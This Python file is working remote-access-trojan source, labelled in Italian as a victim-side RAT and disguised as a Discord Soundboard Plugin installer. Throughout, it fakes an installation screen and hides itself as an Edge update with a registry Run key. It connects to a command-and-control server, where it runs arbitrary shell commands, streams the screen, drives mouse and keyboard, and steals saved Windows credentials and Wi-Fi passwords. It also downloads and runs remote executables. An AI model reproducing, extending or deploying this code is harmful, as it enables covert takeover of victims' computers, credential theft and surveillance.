#!/usr/bin/env python3
# RAT Victim Completo - Discord Soundboard Plugin
# Salva come: rat_victim.py

import os
import sys
import subprocess
import socket
import threading
import time
import json
import base64
import struct
from io import BytesIO
from PIL import Image
import mss
import ctypes
import ctypes.wintypes
import shutil
import requests

C2_SERVER = "172.31.88.235"
C2_PORT = 5555
VIDEO_PORT = 5556
HIDDEN_DIR = os.path.join(os.environ.get('APPDATA', os.path.expanduser("~")), "MicrosoftEdge", "Updates")

GREEN = '\033[92m'
BLUE = '\033[94m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
RED = '\033[91m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

def show_fake_interface():
    os.system('cls' if sys.platform == 'win32' else 'clear')
    print(f"{CYAN}")
    print("""
    ╔═══════════════════════════════════════════════════════════════════════════╗
    ║     Discord Soundboard Plugin v3.2.1 Installation                         ║
    ║                         (c) Discord Inc. 2024                            ║
    ╚═══════════════════════════════════════════════════════════════════════════╝
    """)
    print(f"{YELLOW}    Installing components...{RESET}")
    for i in range(0, 101, 10):
        bar = f"{GREEN}{'█' * (i//2)}{RED}{'░' * (50 - i//2)}{RESET}"
        print(f"\r    [{bar}] {i}%", end='', flush=True)
        time.sleep(0.15)
    print(f"\n{GREEN}    ✓ Installation complete!{RESET}")
    time.sleep(5)

def install_persistence():
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    target_path = os.path.join(HIDDEN_DIR, "EdgeUpdate.exe")
    if not os.path.exists(target_path):
        try:
            shutil.copy2(sys.executable if getattr(sys, 'frozen', False) else __file__, target_path)
            subprocess.run(f'attrib +h "{target_path}"', shell=True)
        except:
            pass
    if sys.platform == "win32":
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "MicrosoftEdgeUpdate", 0, winreg.REG_SZ, target_path)
            winreg.CloseKey(key)
        except:
            pass

class ScreenStreamer:
    def __init__(self):
        self.streaming = False
        self.quality = 50
    def capture_screen(self):
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                if img.width > 1280:
                    ratio = 1280 / img.width
                    new_size = (1280, int(img.height * ratio))
                    img = img.resize(new_size, Image.Resampling.LANCZOS)
                buffer = BytesIO()
                img.save(buffer, format="JPEG", quality=self.quality)
                return base64.b64encode(buffer.getvalue()).decode()
        except:
            return None
    def start_streaming(self, client_socket):
        self.streaming = True
        while self.streaming:
            frame = self.capture_screen()
            if frame:
                frame_bytes = frame.encode()
                size = len(frame_bytes)
                try:
                    client_socket.send(struct.pack('>I', size))
                    client_socket.send(frame_bytes)
                except:
                    break
            time.sleep(0.1)
    def stop_streaming(self):
        self.streaming = False

screen_streamer = ScreenStreamer()

def execute_command(cmd):
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = proc.communicate(timeout=30)
        return (stdout + stderr).decode('utf-8', errors='ignore')
    except:
        return "Error"

def get_system_info():
    info = {
        "hostname": os.environ.get('COMPUTERNAME', socket.gethostname()),
        "username": os.environ.get('USERNAME', os.environ.get('USER', 'unknown')),
        "os": sys.platform,
        "ip": None
    }
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["ip"] = s.getsockname()[0]
        s.close()
    except:
        pass
    return info

def control_mouse(x, y, click_type="move"):
    try:
        user32 = ctypes.windll.user32
        if click_type == "move":
            user32.SetCursorPos(x, y)
        elif click_type == "click_left":
            user32.SetCursorPos(x, y)
            user32.mouse_event(0x0002, 0, 0, 0, 0)
            user32.mouse_event(0x0004, 0, 0, 0, 0)
        elif click_type == "click_right":
            user32.SetCursorPos(x, y)
            user32.mouse_event(0x0008, 0, 0, 0, 0)
            user32.mouse_event(0x0010, 0, 0, 0, 0)
        return True
    except:
        return False

def send_keys(text):
    try:
        user32 = ctypes.windll.user32
        for ch in text:
            shift = ch.isupper() or ch in '!@#$%^&*()_+{}|:"<>?'
            if shift:
                user32.keybd_event(0x10, 0, 0, 0)
            vk = user32.VkKeyScanA(ord(ch))
            user32.keybd_event(vk & 0xFF, 0, 0, 0)
            user32.keybd_event(vk & 0xFF, 0, 2, 0)
            if shift:
                user32.keybd_event(0x10, 0, 2, 0)
            time.sleep(0.05)
        return True
    except:
        return False

def press_key(key_name):
    try:
        user32 = ctypes.windll.user32
        key_map = {"enter":0x0D, "tab":0x09, "backspace":0x08, "delete":0x2E, "esc":0x1B, "space":0x20,
                   "up":0x26, "down":0x28, "left":0x25, "right":0x27}
        vk = key_map.get(key_name.lower(), 0)
        if vk:
            user32.keybd_event(vk, 0, 0, 0)
            user32.keybd_event(vk, 0, 2, 0)
        return vk != 0
    except:
        return False

def steal_credentials():
    creds = {}
    try:
        res = subprocess.run(["cmdkey", "/list"], capture_output=True, text=True, timeout=10)
        creds["windows_saved"] = res.stdout
    except: pass
    try:
        res = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, timeout=10)
        profiles = [line.split(":")[1].strip() for line in res.stdout.splitlines() if "All User Profile" in line]
        wifi = []
        for p in profiles:
            r = subprocess.run(["netsh", "wlan", "show", "profile", p, "key=clear"], capture_output=True, text=True, timeout=10)
            for line in r.stdout.splitlines():
                if "Key Content" in line:
                    wifi.append(f"{p}: {line.split(':')[1].strip()}")
        creds["wifi"] = "\n".join(wifi)
    except: pass
    creds["hostname"] = os.environ.get('COMPUTERNAME', socket.gethostname())
    creds["username"] = os.environ.get('USERNAME', 'unknown')
    return json.dumps(creds)

def power_action(action):
    try:
        if action == "shutdown":
            subprocess.run(["shutdown", "/s", "/t", "30"], timeout=5)
        elif action == "restart":
            subprocess.run(["shutdown", "/r", "/t", "30"], timeout=5)
        elif action == "sleep":
            subprocess.run(["rundll32.exe", "powrprof.dll,SetSuspendState", "0", "1", "0"], timeout=5)
        return True
    except:
        return False

def download_and_execute(url, filename=None):
    try:
        if not filename:
            filename = os.path.basename(url) or "temp.exe"
        path = os.path.join(os.environ.get('TEMP', ''), filename)
        r = requests.get(url, timeout=30)
        with open(path, 'wb') as f:
            f.write(r.content)
        subprocess.Popen(path, shell=True)
        return f"Downloaded to {path}"
    except Exception as e:
        return f"Error: {e}"

def connect_to_c2():
    while True:
        try:
            main_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            main_sock.settimeout(60)
            main_sock.connect((C2_SERVER, C2_PORT))
            sys_info = get_system_info()
            main_sock.send(json.dumps({"type": "beacon", "info": sys_info}).encode())
            video_sock = None
            while True:
                data = main_sock.recv(65536).decode()
                if not data:
                    break
                cmd = json.loads(data)
                cmd_type = cmd.get("type", "")
                if cmd_type == "exec":
                    output = execute_command(cmd.get("cmd", ""))
                    main_sock.send(json.dumps({"type": "result", "output": output}).encode())
                elif cmd_type == "screenshot":
                    img = screen_streamer.capture_screen()
                    main_sock.send(json.dumps({"type": "screenshot_result", "data": img or ""}).encode())
                elif cmd_type == "screen_start":
                    try:
                        video_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        video_sock.connect((C2_SERVER, VIDEO_PORT))
                        threading.Thread(target=screen_streamer.start_streaming, args=(video_sock,), daemon=True).start()
                        main_sock.send(json.dumps({"type": "screen_status", "status": "streaming_started"}).encode())
                    except Exception as e:
                        main_sock.send(json.dumps({"type": "screen_status", "status": f"error: {e}"}).encode())
                elif cmd_type == "screen_stop":
                    screen_streamer.stop_streaming()
                    if video_sock:
                        video_sock.close()
                    main_sock.send(json.dumps({"type": "screen_status", "status": "streaming_stopped"}).encode())
                elif cmd_type == "mouse":
                    control_mouse(cmd.get("x",0), cmd.get("y",0), cmd.get("action","move"))
                    main_sock.send(json.dumps({"type": "status", "result": "mouse_ok"}).encode())
                elif cmd_type == "keys":
                    send_keys(cmd.get("text",""))
                    main_sock.send(json.dumps({"type": "status", "result": "keys_sent"}).encode())
                elif cmd_type == "keypress":
                    press_key(cmd.get("key",""))
                    main_sock.send(json.dumps({"type": "status", "result": "key_pressed"}).encode())
                elif cmd_type == "steal_creds":
                    creds = steal_credentials()
                    main_sock.send(json.dumps({"type": "creds_result", "data": creds}).encode())
                elif cmd_type == "power":
                    power_action(cmd.get("action",""))
                    main_sock.send(json.dumps({"type": "status", "result": "power_ok"}).encode())
                elif cmd_type == "download_exec":
                    result = download_and_execute(cmd.get("url",""))
                    main_sock.send(json.dumps({"type": "status", "result": result}).encode())
                elif cmd_type == "exit_process":
                    main_sock.close()
                    if video_sock:
                        video_sock.close()
                    os._exit(0)
        except:
            time.sleep(30)

def main():
    if not os.path.exists(os.path.join(HIDDEN_DIR, "EdgeUpdate.exe")):
        install_persistence()
    show_fake_interface()
    time.sleep(2)
    threading.Thread(target=connect_to_c2, daemon=True).start()
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
